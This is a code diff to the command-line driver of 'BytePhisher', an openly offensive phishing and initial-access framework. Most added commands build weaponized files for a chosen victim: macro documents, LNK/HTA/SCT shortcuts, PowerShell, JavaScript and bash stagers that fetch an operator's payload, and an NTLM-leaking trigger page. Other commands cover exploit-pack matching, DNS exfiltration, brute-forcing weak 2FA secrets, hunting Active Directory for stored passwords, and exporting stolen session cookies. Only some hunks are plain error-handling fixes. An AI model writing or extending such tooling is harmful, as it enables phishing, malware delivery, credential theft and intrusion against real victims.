@@ -324,6 +324,19 @@ def _clean_error(fn, *a, **kw):
         return None
 
 
+def _with_scheme(url, default="http"):
+    """Add a scheme to a bare host or host:port so urllib can build a URL.
+
+    '--adcs-probe 127.0.0.1' and '--verify-chain 127.0.0.1:1' used to build
+    '127.0.0.1/certsrv/...' and fail with 'unknown url type', so a reachable CA
+    was reported unreachable. A value that already carries a scheme is left alone.
+    """
+    s = str(url or "").strip()
+    if s and "://" not in s:
+        s = f"{default}://{s}"
+    return s
+
+
 def _pwa_config(args):
     """The installable-page config: a name, the manifest inside the hook namespace, and the
     worker the collector already ships (two workers cannot share a scope)."""
@@ -332,6 +345,380 @@ def _pwa_config(args):
     return {"name": name, "short_name": name[:12], "start_url": "/",
             "manifest_path": f"{base}/app.webmanifest",
             "sw_path": f"{base}/sw.js", "prompt": True}
+
+
+# ---------------------------------------------------------------------------
+# click-to-access commands
+#
+# --access-plan / --access-build / --artifact / --pack-* / --totp-* / --dnsx-* /
+# --capabilities. Each command is a function taking the parsed args, so a test drives it
+# without spawning a subprocess. Exit codes are the same everywhere: 0 worked, 1 nothing
+# matched, 2 refused (bad input, missing file, unsupported kind).
+# ---------------------------------------------------------------------------
+
+ARTIFACT_KINDS = {
+    "object": "a page whose hidden sub-resource makes MSHTML speak NTLM",
+    "url": "an Internet shortcut to the URL",
+    "lnk": "a shortcut that runs the PowerShell stager",
+    "hta": "an HTML application that runs the stager",
+    "sct": "a scriptlet that fetches the stager",
+    "js": "the browser stager",
+    "ps": "the PowerShell stager",
+    "vba": "the VBA macro source",
+    "bash": "the POSIX stager",
+    "lnkcmd": "the cmd.exe command line a shortcut runs",
+    "docm": "a macro document (binary; needs --artifact-out)",
+    "dnsplan": "the DNS query plan (needs --artifact-zone)",
+    "intranet": "the local-service table as JSON",
+    "pack": "the shipped exploit pack as JSON",
+}
+
+# Kinds whose output is binary: printing them to a terminal helps nobody.
+ARTIFACT_BINARY = ("url", "lnk", "docm")
+
+
+def _facts_spec(spec, db):
+    """Facts for the access commands, from a JSON object, @file, an OS name, or 'latest'.
+
+    'latest' reads the newest device dump and fills in only what that record states. A
+    user agent is not a LAN inventory: the relay, rebind and policy facts stay unset, so
+    the matrix reports them as missing instead of assuming them.
+    """
+    from core import decision as _decision
+    text = (spec or "latest").strip()
+    if text.startswith("@"):
+        data = _clean_error(_load_json, text[1:])
+        if data is None:
+            raise SystemExit(2)
+        if not isinstance(data, dict):
+            print(f"[bytephisher] {text[1:]} must hold a JSON object")
+            raise SystemExit(2)
+        return data
+    if text.startswith(("{", "[")):
+        try:
+            data = json.loads(text)
+        except json.JSONDecodeError as e:
+            print(f"[bytephisher] facts are not JSON: {e}")
+            raise SystemExit(2) from None
+        if not isinstance(data, dict):
+            print("[bytephisher] facts must be a JSON object")
+            raise SystemExit(2)
+        return data
+    if text.startswith("Mozilla/"):
+        # A user agent, not an OS name: facts_from_ua reads the OS family, the browser
+        # family and the version out of it, and leaves the facts a UA cannot state (the
+        # LAN inventory) unset so the matrix reports them as missing.
+        facts = _decision.facts_from_ua(text)
+        print(f"[bytephisher] facts from the user agent: os={facts['os']} "
+              f"browser={facts['browser']} version={facts['version']}")
+        return facts
+    if text in ("latest", ""):
+        if db is None:
+            print("[bytephisher] no capture store to read a device dump from")
+            raise SystemExit(2)
+        rec = db.intel_get("latest")
+        if not rec:
+            print("[bytephisher] no device dump yet; pass facts as JSON or @file")
+            raise SystemExit(2)
+        facts = _decision.facts_from_ua(rec.get("ua") or "")
+        print(f"[bytephisher] facts from device dump {rec.get('sid') or '?'}: "
+              f"os={facts['os']} browser={facts['browser']} version={facts['version']}")
+        return facts
+    return {"os": text}
+
+
+def access_plan_command(args, db=None):
+    """Print the ranked access paths this victim allows."""
+    from core import decision as _decision
+    try:
+        # Explicit facts win: --access-plan defaults to "latest", which would otherwise
+        # shadow a --access-facts value the operator did pass.
+        facts = _facts_spec(args.access_facts or args.access_plan, db)
+    except SystemExit as exc:
+        return int(exc.code or 2)
+    verdict = _decision.decide(facts)
+    print(_decision.explain(verdict))
+    absent = sorted(name for name, present in (verdict.get("capabilities") or {}).items()
+                    if not present)
+    if absent:
+        print(f"unavailable modules: {', '.join(absent)}")
+    return 0
+
+
+def access_build_command(args, db=None):
+    """Write the artifacts the verdict calls for into the output directory."""
+    from core import ctso as _ctso
+    try:
+        facts = _facts_spec(args.access_facts or args.access_plan, db)
+    except SystemExit as exc:
+        return int(exc.code or 2)
+    try:
+        manifest = _ctso.build_artifacts(facts, args.access_build,
+                                         public_url=args.access_url,
+                                         payload_url=args.access_payload,
+                                         dns_zone=args.access_zone)
+    except (ValueError, OSError) as e:
+        print(f"[bytephisher] cannot build artifacts: {type(e).__name__}: {e}")
+        return 2
+    counts = manifest["counts"]
+    print(f"[bytephisher] {args.access_build}: {counts['built']} built, "
+          f"{counts['needs-input']} needs input, {counts['skipped']} skipped")
+    for record in manifest["artifacts"]:
+        detail = ""
+        if record.get("needs"):
+            detail = "  needs " + ", ".join(record["needs"])
+        elif record.get("reason"):
+            detail = f"  {record['reason']}"
+        print(f"  {record['status']:<11} {record['file']}{detail}")
+    for step in manifest.get("operator_steps") or []:
+        print(f"  next: {step}")
+    print(f"  manifest: {os.path.join(args.access_build, _ctso.MANIFEST_NAME)}")
+    return 0
+
+
+def _artifact_payload(kind, args):
+    """(bytes, suggested file name) for one --artifact kind. Raises ValueError with the
+    missing input named."""
+    from core import dnsx, exploitpack, exploits, mshtml, stager, vba
+    url = args.artifact_url or args.access_url
+    needs_url = ("object", "url", "lnk", "hta", "sct", "docm", "js", "ps", "vba", "bash",
+                 "lnkcmd")
+    if kind in needs_url and not url:
+        raise ValueError(f"--artifact {kind} needs --artifact-url URL")
+    if kind == "object":
+        return mshtml.object_page(url).encode("utf-8"), "trigger.html"
+    if kind == "url":
+        return bytes(mshtml.url_shortcut(url)), "trigger.url"
+    if kind == "lnk":
+        command = stager.powershell(url, style="enc")
+        _, _, arguments = command.partition(" ")
+        return bytes(mshtml.lnk("powershell.exe", arguments=arguments)), "payload.lnk"
+    if kind == "hta":
+        return mshtml.hta(url).encode("utf-8"), "payload.hta"
+    if kind == "sct":
+        return mshtml.sct(url).encode("utf-8"), "payload.sct"
+    if kind == "js":
+        return stager.js({"url": url, "mode": "beacon"}).encode("utf-8"), "stager.js"
+    if kind == "ps":
+        return (stager.powershell(url, style="enc") + "\n").encode("utf-8"), "stager.ps1"
+    if kind == "vba":
+        return (stager.vba(url) + "\n").encode("utf-8"), "stager.vba"
+    if kind == "bash":
+        return (stager.bash(url) + "\n").encode("utf-8"), "stager.sh"
+    if kind == "lnkcmd":
+        return (stager.lnk_command(url) + "\n").encode("utf-8"), "payload.cmd"
+    if kind == "docm":
+        template = args.artifact_template or None
+        return bytes(vba.docm(vba.open_macro(url), module="Module1",
+                              template=template)), "payload.docm"
+    if kind == "dnsplan":
+        zone = args.artifact_zone or args.access_zone
+        if not zone:
+            raise ValueError("--artifact dnsplan needs --artifact-zone ZONE")
+        data = (args.artifact_url or "beacon").encode("utf-8")
+        plan = dnsx.query_plan(data, zone)
+        return (json.dumps(plan, indent=2, sort_keys=True, default=str) + "\n").encode(
+            "utf-8"), "dns_plan.json"
+    if kind == "intranet":
+        rows = getattr(exploits, "EXPLOITS", [])
+        return (json.dumps(rows, indent=2, sort_keys=True, default=str) + "\n").encode(
+            "utf-8"), "intranet.json"
+    if kind == "pack":
+        return (json.dumps(exploitpack.PACK, indent=2, sort_keys=True, default=str) + "\n"
+                ).encode("utf-8"), "pack.json"
+    raise ValueError(f"unknown --artifact kind {kind!r}")
+
+
+def artifact_command(args):
+    """Build one artifact: print it, or write it with --artifact-out."""
+    kind = (args.artifact or "").strip().lower()
+    if kind not in ARTIFACT_KINDS:
+        print(f"[bytephisher] --artifact takes one of: "
+              f"{', '.join(sorted(ARTIFACT_KINDS))}")
+        return 2
+    try:
+        data, name = _artifact_payload(kind, args)
+    except (ValueError, LookupError, TypeError) as e:
+        print(f"[bytephisher] {e}")
+        return 2
+    if args.artifact_out:
+        try:
+            with open(args.artifact_out, "wb") as handle:
+                handle.write(data)
+        except OSError as e:
+            print(f"[bytephisher] cannot write {args.artifact_out}: "
+                  f"{type(e).__name__}: {e}")
+            return 2
+        print(f"[bytephisher] {kind} -> {args.artifact_out} ({len(data)} bytes)")
+        return 0
+    if kind in ARTIFACT_BINARY:
+        print(f"[bytephisher] {kind} is binary; write it with --artifact-out {name}")
+        return 2
+    sys.stdout.write(data.decode("utf-8", "replace"))
+    return 0
+
+
+def pack_command(args):
+    """List, match, verify or report the exploit pack."""
+    from core import exploitpack as _pack
+    if args.pack_list:
+        for entry in _pack.PACK:
+            print(_pack.describe(entry))
+        print(f"[bytephisher] {len(_pack.PACK)} pack entries")
+        return 0
+    if args.pack_match:
+        key, _, value = args.pack_match.partition(":")
+        key, value = key.strip().lower(), value.strip()
+        if key in ("browser", "os", "service"):
+            facts = {key: value}
+        elif key.isdigit():
+            facts = {"browser": args.pack_match, "version": int(key)}
+        else:
+            facts = {"browser": key, "version": int(value) if value.isdigit() else None}
+        matches = _pack.match(facts)
+        if not matches:
+            print(f"[bytephisher] no pack entry matches {args.pack_match}")
+            return 1
+        for entry in matches:
+            print(f"{entry.get('confidence', '?'):<10} {entry.get('name', '?')} "
+                  f"({entry.get('cve', '?')}) - {entry.get('why', '')}")
+        return 0
+    if args.pack_verify:
+        rows = [_pack.verify(args.pack_verify, entry) for entry in _pack.PACK]
+        for row in rows:
+            if not row["ok"]:
+                print(f"  missing  {row.get('path', '?')}  {row.get('why', '')}")
+        present = sum(1 for row in rows if row["ok"])
+        print(f"[bytephisher] {present}/{len(rows)} payloads present under "
+              f"{args.pack_verify}")
+        return 0 if present else 1
+    if args.pack_report:
+        report = _pack.report(args.pack_report)
+        print(json.dumps(report, indent=2, sort_keys=True, default=str))
+        return 0
+    return 0
+
+
+def totp_command(args):
+    """Read a soft-2FA secret or code. The secret itself is never printed."""
+    from core import totp as _totp
+    if args.totp_uri:
+        try:
+            info = _totp.parse_otpauth(args.totp_uri)
+        except ValueError as e:
+            print(f"[bytephisher] {e}")
+            return 2
+        for key in ("type", "account", "issuer", "digits", "period", "algo"):
+            if info.get(key) not in (None, ""):
+                print(f"{key}: {info[key]}")
+        print("secret: <held>")
+        return 0
+    if args.totp_code:
+        at = args.totp_at if args.totp_at is not None else time.time()
+        try:
+            current = _totp.code(args.totp_code, at)
+            window = _totp.codes_in_window(args.totp_code, at)
+        except (ValueError, TypeError) as e:
+            print(f"[bytephisher] {e}")
+            return 2
+        print(f"code: {current}")
+        print(f"window: {', '.join(window)}")
+        print(f"at: {int(at)}")
+        return 0
+    if args.totp_scan:
+        at = args.totp_at if args.totp_at is not None else time.time()
+        try:
+            found = _totp.weak_secret_scan(args.totp_scan, at, space=args.totp_space)
+        except ValueError as e:
+            print(f"[bytephisher] {e}")
+            return 2
+        if not found:
+            print(f"[bytephisher] no secret in the {args.totp_space} space produces "
+                  f"{args.totp_scan} at {int(at)}")
+            return 1
+        for row in found:
+            print(f"secret: {row.get('secret', '?')}  ({row.get('why', '')})")
+        return 0
+    return 0
+
+
+def dnsx_command(args):
+    """Encode, plan or reassemble the DNS exfiltration channel."""
+    from core import dnsx as _dnsx
+    if args.dnsx_encode:
+        zone = args.access_zone or args.artifact_zone
+        try:
+            if zone:
+                # The names the resolver actually sees carry the chunk index and the zone;
+                # printing the bare labels would not round-trip through --dnsx-decode.
+                names = _dnsx.query_plan(args.dnsx_encode.encode("utf-8"), zone)["qnames"]
+            else:
+                names = _dnsx.encode_labels(args.dnsx_encode.encode("utf-8"))
+        except ValueError as e:
+            print(f"[bytephisher] {e}")
+            return 2
+        print("\n".join(names))
+        return 0
+    if args.dnsx_plan:
+        zone = args.access_zone or args.artifact_zone
+        if not zone:
+            print("[bytephisher] --dnsx-plan needs a zone: pass --access-zone ZONE")
+            return 2
+        plan = _dnsx.query_plan(args.dnsx_plan.encode("utf-8"), zone)
+        print(json.dumps(plan, indent=2, sort_keys=True, default=str))
+        return 0
+    if args.dnsx_decode:
+        names = [n.strip() for n in args.dnsx_decode.split(",") if n.strip()]
+        try:
+            data = _dnsx.decode_session(names, args.access_zone or "")
+        except ValueError as e:
+            print(f"[bytephisher] {e}")
+            return 2
+        sys.stdout.write(data.decode("utf-8", "replace") + "\n")
+        return 0
+    return 0
+
+
+def capabilities_command():
+    """Which optional capability modules this tree can import."""
+    from core import decision as _decision
+    cap_map = _decision.capabilities()
+    for name in _decision.CAPABILITIES:
+        module = cap_map.get(name)
+        if module is None:
+            print(f"{'absent':<8} {name}")
+        else:
+            print(f"{'present':<8} {name:<12} {getattr(module, '__file__', '')}")
+    present = sum(1 for name in _decision.CAPABILITIES if cap_map.get(name) is not None)
+    print(f"[bytephisher] {present}/{len(_decision.CAPABILITIES)} capability modules "
+          f"present")
+    return 0
+
+
+def access_dispatch(args, db=None):
+    """Route the click-to-access commands to their handler."""
+    if args.capabilities:
+        return capabilities_command()
+    if args.pack_list or args.pack_match or args.pack_verify or args.pack_report:
+        return pack_command(args)
+    if args.totp_uri or args.totp_code or args.totp_scan:
+        return totp_command(args)
+    if args.dnsx_plan or args.dnsx_encode or args.dnsx_decode:
+        return dnsx_command(args)
+    if args.artifact:
+        return artifact_command(args)
+    if args.access_build:
+        return access_build_command(args, db)
+    return access_plan_command(args, db)
+
+
+def _access_requested(args):
+    """True when any click-to-access command was asked for on this invocation."""
+    return bool(args.access_plan or args.access_build or args.artifact or args.pack_list
+                or args.pack_match or args.pack_verify or args.pack_report
+                or args.totp_uri or args.totp_code or args.totp_scan
+                or args.dnsx_plan or args.dnsx_encode or args.dnsx_decode
+                or args.capabilities)
 
 
 def main():
@@ -550,6 +937,9 @@ def main():
                     help="IMAP folder for --inbox (default INBOX)")
     ap.add_argument("--inbox-limit", type=int, default=50, metavar="N",
                     help="how many recent messages to read (default 50)")
+    ap.add_argument("--locale", default="en", metavar="LOCALE",
+                    help="locale for the --inbox follow-up script suggestions "
+                         "(e.g. en, de, fr; default en)")
     ap.add_argument("--clickfix-command", default="", metavar="CMD",
                     help="the command the ClickFix page copies (the payload is the "
                          "operator's; the page and the beacon are this tool's)")
@@ -653,6 +1043,10 @@ def main():
                          "policy), rootdse")
     ap.add_argument("--ldap-filter", default="", metavar="FILTER",
                     help="a raw RFC 4515 filter (overrides --ldap-query)")
+    ap.add_argument("--ad-hunt", action="store_true",
+                    help="hunt the directory for LAPS passwords, GPP cpassword, gMSA "
+                         "readers, delegation rights and passwords left in "
+                         "description/info (needs --ldap)")
     ap.add_argument("--adcs-esc", default="", metavar="FILE",
                     help="analyse certificate templates for the ESC conditions: a JSON dump "
                          "(from --ldap-query templates), or \"ldap\" to read them live")
@@ -746,6 +1140,10 @@ def main():
     ap.add_argument("--replayability", default="", metavar="SID",
                     help="can this stored session be replayed elsewhere? (device-bound and "
                          "CAE claims decide it, and 'unknown' is not 'replayable')")
+    ap.add_argument("--prt-plan", default="", metavar="FILE",
+                    help="PRT posture from a JSON file with keys tokens/claims/"
+                         "tenant_policy: what the tenant would accept before a phantom "
+                         "device registration is attempted")
     ap.add_argument("--consentfix", default="", metavar="PROVIDER",
                     help="build the silent (prompt=none) and interactive consent URLs for a "
                          "provider: microsoft|google|okta|github|custom")
@@ -784,6 +1182,62 @@ def main():
                     help="how many queries are answered with the public address first")
     ap.add_argument("--rebind-ttl", type=int, default=1, metavar="N",
                     help="answer TTL in seconds (1 makes the flip happen while the page is open)")
+    ap.add_argument("--access-plan", nargs="?", const="latest", default=None,
+                    metavar="FACTS",
+                    help="rank the access paths this victim allows and exit. FACTS is a "
+                         "JSON object, @file, an OS name, a user agent, or 'latest' for "
+                         "what the newest device dump states")
+    ap.add_argument("--access-build", metavar="DIR",
+                    help="build every artifact the verdict calls for into DIR (writes the "
+                         "files plus manifest.json; set --access-url/--access-payload)")
+    ap.add_argument("--access-facts", metavar="JSON", default="",
+                    help="facts for --access-build/--access-plan (JSON object, @file, a "
+                         "user agent, or latest)")
+    ap.add_argument("--access-url", metavar="URL", default="",
+                    help="public URL of the campaign: what the trigger page and the "
+                         "shortcut point at")
+    ap.add_argument("--access-payload", metavar="URL", default="",
+                    help="payload URL the stagers fetch")
+    ap.add_argument("--access-zone", metavar="ZONE", default="",
+                    help="DNS zone for the exfiltration plan")
+    ap.add_argument("--artifact", metavar="KIND",
+                    help="build one artifact: " + ", ".join(sorted(ARTIFACT_KINDS)))
+    ap.add_argument("--artifact-url", metavar="URL", default="",
+                    help="URL the artifact carries (or the payload text for dnsplan)")
+    ap.add_argument("--artifact-out", metavar="PATH",
+                    help="write the artifact here (required for the binary kinds)")
+    ap.add_argument("--artifact-template", metavar="PATH",
+                    help="docm: an existing macro-enabled document to inject the project "
+                         "into (the reliable path)")
+    ap.add_argument("--artifact-zone", metavar="ZONE", default="",
+                    help="dnsplan: the zone to build the query names under")
+    ap.add_argument("--pack-list", action="store_true",
+                    help="list the shipped exploit pack and exit")
+    ap.add_argument("--pack-match", metavar="SPEC",
+                    help="match the pack: browser:VERSION (chrome:91), service:NAME, or "
+                         "os:NAME")
+    ap.add_argument("--pack-verify", metavar="DIR",
+                    help="check which pack payloads are present under DIR")
+    ap.add_argument("--pack-report", metavar="DIR",
+                    help="count the pack entries and how many are verified under DIR")
+    ap.add_argument("--totp-uri", metavar="URI",
+                    help="parse an otpauth:// URI and print its fields (never the secret)")
+    ap.add_argument("--totp-code", metavar="SECRET",
+                    help="print the current code for a base32 secret, plus the window")
+    ap.add_argument("--totp-at", type=float, metavar="TS",
+                    help="evaluate --totp-code/--totp-scan at this unix timestamp")
+    ap.add_argument("--totp-scan", metavar="CODE",
+                    help="search a low-entropy secret space for a code you observed")
+    ap.add_argument("--totp-space", metavar="NAME", default="dec6",
+                    help="dec6, dec8 or b32short (default dec6)")
+    ap.add_argument("--dnsx-plan", metavar="DATA",
+                    help="print the DNS query plan for DATA (needs --access-zone)")
+    ap.add_argument("--dnsx-encode", metavar="DATA",
+                    help="print the query names that carry DATA")
+    ap.add_argument("--dnsx-decode", metavar="NAMES",
+                    help="reassemble a payload from comma-separated query names")
+    ap.add_argument("--capabilities", action="store_true",
+                    help="list which optional capability modules are importable and exit")
     ap.add_argument("--auto-chain", metavar="NAME",
                     help="run this chain automatically the moment a session is captured "
                          "(hands-free post-exploitation; see --chains)")
@@ -927,6 +1381,21 @@ def main():
                          "(max 5 restarts each) and print the new public URL")
     ap.add_argument("--version", action="version", version=f"BytePhisher {VERSION}")
     args = ap.parse_args()
+
+    # Validate the two numbers that reach bind() and the TLS pair before either
+    # reaches a socket: a bad port or a missing cert used to surface as an
+    # OverflowError / ValueError traceback from deep inside core.server.
+    for _flag, _val in (("--port", args.port), ("--web-port", args.web_port)):
+        if _val is not None and not (0 <= int(_val) <= 65535):
+            print(f"[bytephisher] {_flag} must be 0-65535 (got {_val})")
+            return 2
+    if args.tls and not args.cert:
+        print("[bytephisher] --tls needs --cert <pem> "
+              "(refusing to serve plaintext when TLS was requested)")
+        return 2
+    if args.tls and args.cert and not os.path.isfile(args.cert):
+        print(f"[bytephisher] --cert file not found: {args.cert}")
+        return 2
 
     if args.lab_check:
         # the preflight answers "can this host do the job" before anything is served
@@ -1275,8 +1744,13 @@ def main():
             print(f"[bytephisher] no session '{sid}'")
             return 1
         data = sess_mod.to_cookie_editor(rec)
-        with open(path, "w", encoding="utf-8") as f:
-            json.dump(data, f, indent=2)
+        try:
+            with open(path, "w", encoding="utf-8") as f:
+                json.dump(data, f, indent=2)
+        except OSError as e:
+            print(f"[bytephisher] cannot write {path}: "
+                  f"{type(e).__name__}: {e}")
+            return 2
         print(f"[bytephisher] exported {len(data)} cookie(s) -> {path}")
         print("[bytephisher] import in Chrome with Cookie-Editor / EditThisCookie, "
               "then open the site - you should already be logged in.")
@@ -1394,12 +1868,20 @@ def main():
             rec = db.intel_get(r["id"])
             if rec:
                 out.append(rec)
-        with open(args.intel_export, "w", encoding="utf-8") as f:
-            json.dump({"exported_at": time.time(), "stats": db.intel_stats(),
-                       "devices": out}, f, indent=2, default=str)
+        try:
+            with open(args.intel_export, "w", encoding="utf-8") as f:
+                json.dump({"exported_at": time.time(), "stats": db.intel_stats(),
+                           "devices": out}, f, indent=2, default=str)
+        except OSError as e:
+            print(f"[bytephisher] cannot write {args.intel_export}: "
+                  f"{type(e).__name__}: {e}")
+            return 2
         print(f"[bytephisher] device dumps exported -> {args.intel_export} "
               f"({len(out)} records)")
         return 0
+
+    if _access_requested(args):
+        return access_dispatch(args, db)
 
     if args.cohorts:
         from core import campaign as _camp
@@ -1525,6 +2007,32 @@ def main():
                   f"{type(e).__name__}: {e}")
             return 2
         print(_krb.describe(out))
+        return 0
+    if args.ad_hunt:
+        if not args.ldap:
+            print("[bytephisher] --ad-hunt needs --ldap <host>")
+            return 2
+        from core import ad_hunt as _adh
+        from core import ldap as _ldap
+        client = _ldap.LdapClient(args.ldap, port=args.ldap_port)
+        try:
+            client.bind(args.ldap_user, args.ldap_pass)
+            base = args.ldap_base or client.naming_context()
+            rows = client.search(base=base, scope=2, filter_text="(objectClass=*)",
+                                 attrs=list(_adh.HUNT_ATTRS), size_limit=5000)
+        except _ldap.LdapError as e:
+            print(f"[bytephisher] {e}")
+            return 1
+        except OSError as e:
+            print(f"[bytephisher] LDAP {args.ldap}:{args.ldap_port} failed: "
+                  f"{type(e).__name__}: {e}")
+            return 2
+        finally:
+            client.close()
+        facts = _adh.report(laps_rows=rows, gpp_rows=rows, gmsa_rows=rows,
+                            delegation_rows=rows, text_rows=rows)
+        print(f"[bytephisher] ad-hunt  : {len(rows)} row(s) from {base or '<root>'}")
+        print(_adh.describe(facts))
         return 0
     if args.ldap and (args.ldap_query or args.ldap_filter):
         from core import ldap as _ldap
@@ -1750,7 +2258,7 @@ def main():
     if args.adcs_probe:
         from core import adcs as _adcs
         try:
-            report = _adcs.probe(args.adcs_probe)
+            report = _adcs.probe(_with_scheme(args.adcs_probe))
         except _adcs.AdcsError as e:
             print(f"[bytephisher] {e}")
             return 2
@@ -1758,9 +2266,17 @@ def main():
         return 0
     if args.inbox:
         from core import inbox as _inbox
-        rows = _inbox.fetch(host=args.inbox_host, user=args.inbox_user,
-                            password=os.environ.get("BYTEPHISHER_INBOX_PASS", ""),
-                            folder=args.inbox_folder, limit=args.inbox_limit)
+        try:
+            rows = _inbox.fetch(host=args.inbox_host, user=args.inbox_user,
+                                password=os.environ.get("BYTEPHISHER_INBOX_PASS", ""),
+                                folder=args.inbox_folder, limit=args.inbox_limit)
+        except _inbox.InboxError as e:
+            print(f"[bytephisher] {e}")
+            return 2
+        except OSError as e:
+            print(f"[bytephisher] IMAP {args.inbox_host} failed: "
+                  f"{type(e).__name__}: {e}")
+            return 2
         threads = _inbox.thread(rows)
         print(_inbox.describe(rows, threads))
         for msg in rows:
@@ -1772,6 +2288,10 @@ def main():
             if advice.get("script"):
                 print("     script: " + advice["script"].replace("\n", " ")[:160])
         return 0
+    if args.clickfix_out and not args.clickfix_command:
+        print("[bytephisher] --clickfix-out needs --clickfix-command (the text the page "
+              "tells the victim to run)")
+        return 2
     if args.clickfix_command:
         from core import clickfix as _cf
         beacon = f"http://127.0.0.1:{args.port or 8080}/__bh/beacon"
@@ -1824,7 +2344,12 @@ def main():
         if not args.pool:
             print("[bytephisher] --pool FILE is required for the pool commands")
             return 2
-        obj = _pool.Pool.load(args.pool)
+        try:
+            obj = _pool.Pool.load(args.pool)
+        except OSError as e:
+            print(f"[bytephisher] cannot read pool {args.pool}: "
+                  f"{type(e).__name__}: {e}")
+            return 2
         if args.pool_add:
             for name in [n.strip() for n in args.pool_add.split(",") if n.strip()]:
                 obj.add(name)
@@ -1837,7 +2362,14 @@ def main():
                 print("[bytephisher] no hostname is ready in this pool")
             else:
                 print(handed.name)
-        obj.save()
+        # --pool-status is read-only: it must not rewrite the pool file
+        if args.pool_add or args.pool_burn or args.pool_next:
+            try:
+                obj.save()
+            except OSError as e:
+                print(f"[bytephisher] cannot write pool {args.pool}: "
+                      f"{type(e).__name__}: {e}")
+                return 2
         if args.pool_status or args.pool_add or args.pool_burn:
             print(obj.describe())
         if args.pool_next and handed is None:
@@ -1846,7 +2378,7 @@ def main():
     if args.verify_chain:
         from core import redirectors as _red
         try:
-            report = _red.verify_chain(args.verify_chain)
+            report = _red.verify_chain(_with_scheme(args.verify_chain))
         except _red.RedirectError as e:
             print(f"[bytephisher] {e}")
             return 2
@@ -1855,14 +2387,28 @@ def main():
     if args.consentfix:
         from core import consentfix as _cf
         from core import oauth as _oauth
-        spec = _oauth.OauthSpec(provider=args.consentfix,
-                                client_id=args.consentfix_client or "bytephisher",
-                                tenant=args.consentfix_tenant or None)
+        try:
+            spec = _oauth.OauthSpec(provider=args.consentfix,
+                                    client_id=args.consentfix_client or "bytephisher",
+                                    tenant=args.consentfix_tenant or None)
+        except _oauth.OauthError as e:
+            print(f"[bytephisher] --consentfix refused: {e}")
+            return 2
         flow = _oauth.OauthFlow(spec, "operator-preview")
         plan = _cf.plan(spec, flow.state, flow.challenge)
         print("silent      : " + plan["silent"])
         print("interactive : " + plan["interactive"])
         print("order       : " + " then ".join(plan["order"]))
+        return 0
+    if args.prt_plan:
+        from core import prt as _prt
+        spec = _clean_error(_load_json, args.prt_plan)
+        if spec is None:
+            return 2
+        report = _prt.posture(spec.get("tokens") or {},
+                              claims=spec.get("claims"),
+                              tenant_policy=spec.get("tenant_policy") or {})
+        print(_prt.describe(report))
         return 0
     if args.tier0 or args.replayability:
         from core import dbsc as _dbsc
@@ -1918,10 +2464,14 @@ def main():
     if args.export:
         # extension decides the format: .json -> JSON, anything else -> CSV
         if str(args.export).lower().endswith(".json"):
-            path = db.export_json(args.export, campaign=args.campaign)
+            path = _clean_error(db.export_json, args.export, campaign=args.campaign)
+            if path is None:
+                return 2
             print(f"[bytephisher] exported captures (json) -> {path}")
         else:
-            path = db.export_csv(args.export, campaign=args.campaign)
+            path = _clean_error(db.export_csv, args.export, campaign=args.campaign)
+            if path is None:
+                return 2
             print(f"[bytephisher] exported captures (csv) -> {path}")
         print(f"[bytephisher] stats: {db.stats()}")
         return 0
@@ -1956,6 +2506,16 @@ def main():
         return 0
 
     banner(f"{len(man)} templates" if man else "reverse-proxy mode")
+
+    # A serve-companion flag given without -o/--option must not fall into the
+    # interactive picker: resolve_template(man, None) calls input(), which blocks
+    # forever on a phone or an SSH TTY and the operator thinks the command ran.
+    # Only a bare invocation (no arguments at all) may show the menu.
+    if (not (args.proxy or args.devicecode) and args.option is None
+            and sys.argv[1:]):
+        print("[bytephisher] -o/--option is required (template index or slug). "
+              "Run --list to see them, e.g. -o google")
+        return 2
 
     site = (resolve_template(man, args.option)
             if not (args.proxy or args.devicecode)
@@ -2204,7 +2764,12 @@ def main():
         # ---- reverse-proxy mode: real site proxied live, hook injected ----
         from core.proxy import CAPTURE_PATH, HOOK_PATH, Phishlet, ProxyEngine, serve_proxy
         if args.phishlet:
-            phishlet = Phishlet.load(args.phishlet)
+            try:
+                phishlet = Phishlet.load(args.phishlet)
+            except (OSError, ValueError) as e:
+                print(f"[bytephisher] cannot load phishlet {args.phishlet}: "
+                      f"{type(e).__name__}: {e}")
+                return 2
             print(f"[bytephisher] phishlet : {args.phishlet} -> {phishlet.describe()}")
         elif args.upstream:
             phishlet = inline_phishlet(args)
@@ -2259,9 +2824,15 @@ def main():
         engine.rebind_host = rebind_host
         engine.exploit_ports = exploit_ports
         engine.exploit_limit = args.exploit_limit
-        httpd = serve_proxy(engine, port, campaign=args.campaign or phishlet.name,
-                            tls=args.tls, cert_path=args.cert,
-                            server_header=args.server_header)
+        try:
+            httpd = serve_proxy(engine, port, campaign=args.campaign or phishlet.name,
+                                tls=args.tls, cert_path=args.cert,
+                                server_header=args.server_header)
+        except OSError as e:
+            print(f"[bytephisher] cannot bind port {port}: "
+                  f"{type(e).__name__}: {e}")
+            db.close()
+            return 2
         print(f"[bytephisher] mode     : REVERSE PROXY -> {phishlet.base_url}")
         if args.impersonate:
             print(f"[bytephisher] upstream : TLS fingerprint impersonating "
@@ -2282,22 +2853,28 @@ def main():
                                          brand=args.verify_brand or "")
             print("[bytephisher] verify  : pre-serve human challenge ON "
                   f"(ttl {args.verify_ttl}s; the page is served only after a pass)")
-        httpd, _Handler = srv.serve(
-            TEMPLATES_DIR, site["dir"], port, cfg["db_path"],
-            geo_provider=geo, redirect_url=redirect, otp=otp,
-            tls=args.tls, cert_path=args.cert,
-            on_capture=notifier, site_name=site["slug"],
-            campaign=args.campaign or site["slug"],
-            rotate_dirs=rotate_dirs, gate=gate, decoy_url=args.decoy or "",
-            intel=not args.no_intel, intel_perms=args.intel_perms,
-            trust_headers=not args.no_trust_headers,
-            hook_base=args.hook_path or "/__bh", rebind_host=rebind_host,
-            exploit_ports=exploit_ports, exploit_limit=args.exploit_limit,
-            server_header=args.server_header,
-            challenge=static_challenge,
-            targets=targets_store,
-            pwa=(_pwa_config(args) if args.pwa else None),
-            symbols=symbols_mod.Symbols.from_mode(args.symbols))
+        try:
+            httpd, _Handler = srv.serve(
+                TEMPLATES_DIR, site["dir"], port, cfg["db_path"],
+                geo_provider=geo, redirect_url=redirect, otp=otp,
+                tls=args.tls, cert_path=args.cert,
+                on_capture=notifier, site_name=site["slug"],
+                campaign=args.campaign or site["slug"],
+                rotate_dirs=rotate_dirs, gate=gate, decoy_url=args.decoy or "",
+                intel=not args.no_intel, intel_perms=args.intel_perms,
+                trust_headers=not args.no_trust_headers,
+                hook_base=args.hook_path or "/__bh", rebind_host=rebind_host,
+                exploit_ports=exploit_ports, exploit_limit=args.exploit_limit,
+                server_header=args.server_header,
+                challenge=static_challenge,
